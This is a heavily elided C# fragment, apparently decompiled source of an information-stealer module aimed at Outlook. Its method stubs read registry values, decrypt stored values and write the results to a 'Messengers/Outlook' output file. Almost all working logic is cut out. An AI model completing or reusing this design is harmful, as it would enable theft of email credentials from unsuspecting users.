...
internal class Outlook
{
	...
	public static void Start()
	{
		try
		{
			...
			if (!string.IsNullOrEmpty(text))
			{
				...
				DynamicFiles.WriteAllText(Path.Combine("Messengers", "Outlook", "Outlook.txt"), text + "\r\n");
			}
		}
		catch
		{
	...
	public static string Get(string path, string[] clients)
	{
		string text = "";
		try
		{
	...
	public static object GetInfoFromRegistry(string path, string valueName)
	{
		object result = null;
		try
		{
	...
	public static string DecryptValue(byte[] encrypted)
	{
		try
		{
